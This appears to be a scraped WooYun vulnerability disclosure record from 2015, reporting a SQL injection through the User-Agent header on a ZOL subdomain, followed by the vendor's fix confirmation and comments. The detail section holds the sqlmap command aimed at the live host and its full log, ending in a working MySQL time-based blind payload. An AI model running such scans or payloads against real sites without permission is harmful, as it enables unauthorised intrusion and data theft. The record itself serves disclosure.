{"id": 23834, "wybug_id": "wooyun-2015-0123318", "wybug_title": "中关村在线某分站Http消息头SQL注入", "wybug_corp": "中关村在线", "wybug_author": "凌零0", "wybug_date": "2015-06-28 21:43", "wybug_open_date": "2015-06-29 09:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-29：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述：  详细说明：  中关村中关村ZOL恒星系统，在线新营销平台，可泄露大量客户信息，影响不小问题ip：http://e.zol.com.cn/>python sqlmap.py -u \"http://e.zol.com.cn/Default/Check/\"  --level 3 -p \"user-agent\"   漏洞证明：  \nC:\\Users\\wjl\\Desktop\\sqlmapproject-sqlmap-e8f87bf>python sqlmap.py -u \"http://e.zol.com.cn/Default/Check/\"  --level 3 -p \"user-agent\"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150609}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:57:41[13:57:41] [WARNING] you've provided target URL without any GET parameters (e.g. www.site.com/article.php?id=1) and without providing any POST parameters through --data optiondo you want to try URI injections in the target URL itself? [Y/n/q] n[13:57:43] [INFO] testing connection to the target URL[13:57:43] [INFO] heuristics detected web page charset 'ascii'[13:57:44] [INFO] testing if the target URL is stable. This can take a couple of seconds[13:57:45] [INFO] target URL is stable[13:57:45] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic[13:57:45] [WARNING] User-Agent parameter 'User-Agent' does not appear dynamic[13:57:45] [WARNING] heuristic (basic) test shows that User-Agent parameter 'User-Agent' might not be injectable[13:57:45] [INFO] testing for SQL injection on User-Agent parameter 'User-Agent'[13:57:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[13:57:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'[13:58:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[13:58:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'[13:58:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'[13:59:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDERBY or GROUP BY clause (MAKE_SET)'[13:59:15] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'[13:59:15] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace(original value)'[13:59:16] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace'[13:59:16] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'[13:59:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'[13:59:17] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'[13:59:18] [INFO] testing 'Oracle boolean-based blind - Parameter replace'[13:59:18] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'[13:59:19] [INFO] testing 'SAP MaxDB boolean-based blind - Parameter replace'[13:59:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'[13:59:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'[13:59:21] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BYclause'[13:59:22] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'[13:59:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'[13:59:24] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'[13:59:25] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'[13:59:37] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'[13:59:48] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[13:59:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'[13:59:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'[14:00:01] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[14:00:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[14:00:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[14:00:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'[14:00:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[14:00:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'[14:00:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'[14:00:40] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'[14:00:43] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'[14:00:47] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[14:00:47] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'[14:00:47] [INFO] testing 'PostgreSQL error-based - Parameter replace'[14:00:48] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'[14:00:48] [INFO] testing 'Oracle error-based - Parameter replace'[14:00:48] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause'[14:00:48] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause'[14:00:49] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'[14:00:49] [INFO] testing 'MySQL inline queries'[14:00:49] [INFO] testing 'PostgreSQL inline queries'[14:00:49] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[14:00:49] [INFO] testing 'Oracle inline queries'[14:00:49] [INFO] testing 'SQLite inline queries'[14:00:50] [INFO] testing 'Firebird inline queries'[14:00:50] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'[14:00:53] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'[14:00:57] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'[14:01:01] [INFO] testing 'MySQL > 5.0.11 stacked queries'[14:01:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'[14:01:08] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'[14:01:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'[14:01:16] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'[14:01:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'[14:01:31] [INFO] User-Agent parameter 'User-Agent' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectableit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]for the remaining tests, do you want to include all tests for 'MySQL' extendingprovided level (3) and risk (1) values? [Y/n][16:28:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[16:28:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[16:28:07] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'[16:28:12] [INFO] testing 'Generic UNION query (NULL) - 22 to 40 columns'[16:28:14] [INFO] testing 'Generic UNION query (random number) - 22 to 40 columns'[16:28:23] [INFO] testing 'Generic UNION query (NULL) - 42 to 60 columns'[16:28:26] [INFO] checking if the injection point on User-Agent parameter 'User-Agent' is a false positiveUser-Agent parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 1264 HTTP(s) requests:---Parameter: User-Agent (User-Agent)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: sqlmap/1.0-dev-nongit-20150609 (http://sqlmap.org)' AND (SELECT * FROM (SELECT(SLEEP(5)))FEGa) AND 'GTgn'='GTgn---[16:29:18] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5.0.12[16:29:18] [INFO] fetched data logged to text files under 'C:\\Users\\wjl\\.sqlmap\\output\\e.zol.com.cn'\n\n\n\n\n\n\n点到为止   修复方案：  求rank大礼包！！！   版权声明：转载请注明来源 凌零0@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-29 09:38 厂商回复： 漏洞已经确认，感谢“凌零0”对我们的关注~~ 最新状态： 2015-06-29：漏洞已修复  ", "replys": "漏洞评价：\n评论\n     2015-06-29 09:47 |    \t\tqdq \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 有关部门)\t\t \n  修复的好快    \n     2015-06-29 12:15 |    \t\tanting \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:38        | 活到老，学到老)\t\t \n  fast    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}